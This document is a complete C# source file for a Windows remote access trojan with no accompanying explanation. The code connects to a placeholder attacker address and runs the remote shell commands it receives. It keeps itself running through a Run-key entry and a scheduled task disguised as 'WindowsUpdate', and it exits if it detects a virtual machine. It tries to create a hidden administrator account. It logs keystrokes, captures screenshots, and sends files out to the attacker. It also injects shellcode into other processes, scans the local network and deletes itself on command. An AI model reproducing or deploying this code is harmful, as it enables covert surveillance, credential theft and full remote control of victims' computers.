using System;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.IO;
using System.Drawing;
using System.Windows.Forms;
using System.Threading;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Net.NetworkInformation;
using System.Collections.Generic;

public class Program
{
    [DllImport("user32.dll")]
    private static extern int GetAsyncKeyState(int vKey);

    [DllImport("kernel32.dll")]
    private static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    // CONSTANTS FOR PROCESS INJECTION
    const int PROCESS_ALL_ACCESS = 0x1F0FFF;
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    private static TcpClient _client;
    private static NetworkStream _stream;
    private static string _host = "REPLACE_IP";
    private static int _port = 1337; // xd

    private static StringBuilder _keylog = new StringBuilder();
    private static Thread _keyloggerThread;

    public static void Main()
    {
        InstallPersistence();
        if (IsVirtualMachine())
        {
            Environment.Exit(0);
        }
        if (!TryPrivEsc())
        {
        }
        StartKeylogger();
        while (true)
        {
            try
            {
                Connect();
                Listen();
            }
            catch (Exception)
            {
                Thread.Sleep(5000);
            }
        }
    }

    private static void InstallPersistence()
    {
        try
        {
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue("WindowsUpdate", Assembly.GetExecutingAssembly().Location);
            Process.Start(new ProcessStartInfo
            {
                FileName = "schtasks",
                Arguments = "/create /tn \"WindowsUpdateService\" /tr \"" + Assembly.GetExecutingAssembly().Location + "\" /sc onlogon /rl highest /f",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });
        }
        catch { /* SILENT FAIL */ }
    }

    private static bool IsVirtualMachine()
    {
        try
        {
            string[] vmKeywords = { "vmware", "virtual", "vbox", "qemu", "hyper-v" };
            string computerName = Environment.MachineName.ToLower();
            string userName = Environment.UserName.ToLower();
            foreach (string keyword in vmKeywords)
            {
                if (computerName.Contains(keyword) || userName.Contains(keyword))
                    return true;
            }
            PerformanceCounter ramCounter = new PerformanceCounter("Memory", "Available Bytes");
            float totalMemoryGB = ramCounter.RawValue / 1073741824.0f;
            if (totalMemoryGB % 1 == 0)
                return true;
            int processorCount = Environment.ProcessorCount;
            if (processorCount <= 2)
                return true;
        }
        catch { }
        return false;
    }

    private static bool TryPrivEsc()
    {
        try
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            if (principal.IsInRole(WindowsBuiltInRole.Administrator))
                return true;
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c net user admin P@ssw0rd /add && net localgroup administrators admin /add",
                Verb = "runas",
                UseShellExecute = true,
                WindowStyle = ProcessWindowStyle.Hidden
            });
            return true;
        }
        catch { return false; }
    }

    private static void StartKeylogger()
    {
        _keyloggerThread = new Thread(() =>
        {
            while (true)
            {
                Thread.Sleep(10);
                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if (state == 1 || state == -32767)
                    {
                        _keylog.Append((Keys)i + " ");
                        if (_keylog.Length > 1000)
                        {
                            try
                            {
                                byte[] keyData = Encoding.ASCII.GetBytes("keylog " + _keylog.ToString());
                                _stream.Write(keyData, 0, keyData.Length);
                                _keylog.Clear();
                            }
                            catch { }
                        }
                    }
                }
            }
        });
        _keyloggerThread.IsBackground = true;
        _keyloggerThread.Start();
    }

    private static void Connect()
    {
        _client = new TcpClient();
        _client.Connect(_host, _port);
        _stream = _client.GetStream();
    }

    private static void Listen()
    {
        byte[] buffer = new byte[4096];
        while (true)
        {
            int bytesRead = _stream.Read(buffer, 0, buffer.Length);
            string command = Encoding.ASCII.GetString(buffer, 0, bytesRead);
            string result = ExecuteCommand(command);
            byte[] resultBytes = Encoding.ASCII.GetBytes(result);
            _stream.Write(resultBytes, 0, resultBytes.Length);
        }
    }

    private static string ExecuteCommand(string cmd)
    {
        try
        {
            if (cmd.StartsWith("shell "))
            {
                string args = cmd.Substring(6);
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + args);
                psi.RedirectStandardOutput = true;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                Process p = Process.Start(psi);
                return p.StandardOutput.ReadToEnd();
            }
            else if (cmd == "screenshot")
            {
                int width = Screen.PrimaryScreen.Bounds.Width;
                int height = Screen.PrimaryScreen.Bounds.Height;
                using (Bitmap bmp = new Bitmap(width, height))
                {
                    using (Graphics g = Graphics.FromImage(bmp))
                    {
                        g.CopyFromScreen(0, 0, 0, 0, new Size(width, height));
                    }
                    string tempPath = Path.GetTempFileName() + ".png";
                    bmp.Save(tempPath);
                    return "Screenshot: " + tempPath;
                }
            }
            else if (cmd == "info")
            {
                return string.Format("User: {0} | OS: {1} | Admin: {2} | VM: {3}",
                    Environment.UserName,
                    Environment.OSVersion,
                    new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator),
                    IsVirtualMachine());
            }
            else if (cmd.StartsWith("download "))
            {
                string filePath = cmd.Substring(9);
                byte[] fileData = File.ReadAllBytes(filePath);
                return Convert.ToBase64String(fileData);
            }
            else if (cmd.StartsWith("upload "))
            {
                string[] parts = cmd.Split(new char[] { ' ' }, 3);
                string filePath = parts[1];
                byte[] fileData = Convert.FromBase64String(parts[2]);
                File.WriteAllBytes(filePath, fileData);
                return "File uploaded: " + filePath;
            }
            else if (cmd.StartsWith("inject "))
            {
                string processName = cmd.Substring(7);
                InjectIntoProcess(processName);
                return "Injected into " + processName;
            }
            else if (cmd == "keylog")
            {
                string logs = _keylog.ToString();
                _keylog.Clear();
                return "Keylog: " + logs;
            }
            else if (cmd == "netscan")
            {
                return NetworkScan();
            }
            else if (cmd == "webcam")
            {
                return "Webcam capture not implemented";
            }
            else if (cmd == "recordmic")
            {
                return "Microphone recording not implemented";
            }
            else if (cmd == "uninstall")
            {
                Uninstall();
                return "Uninstalling...";
            }
            return "Unknown command: " + cmd;
        }
        catch (Exception ex)
        {
            return "Error: " + ex.Message;
        }
    }

    private static void InjectIntoProcess(string processName)
    {
        try
        {
            Process targetProcess = Process.GetProcessesByName(processName)[0];
            IntPtr procHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcess.Id);
            byte[] payload = new byte[] {
                0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0xE9, 0x00, 0x00
            };

            IntPtr allocMem = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)payload.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            IntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMem, payload, (uint)payload.Length, out bytesWritten);

            CreateRemoteThread(procHandle, IntPtr.Zero, 0, allocMem, IntPtr.Zero, 0, IntPtr.Zero);
        }
        catch { }
    }

    private static string NetworkScan()
    {
        StringBuilder results = new StringBuilder();
        string baseIP = "192.168.1.";

        for (int i = 1; i < 255; i++)
        {
            string ip = baseIP + i;
            Ping ping = new Ping();
            try
            {
                PingReply reply = ping.Send(ip, 100);
                if (reply.Status == IPStatus.Success)
                    results.AppendLine(ip + " - ALIVE");
            }
            catch { }
        }
        return results.ToString();
    }

    private static void Uninstall()
    {
        try
        {
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.DeleteValue("WindowsUpdate", false);
            string batchScript = "@echo off\nping 127.0.0.1 -n 3 > nul\ndel \"" + Assembly.GetExecutingAssembly().Location + "\"\ndel %0";
            File.WriteAllText("uninstall.bat", batchScript);
            Process.Start("uninstall.bat");
        }
        catch { }
        Environment.Exit(0);
    }


}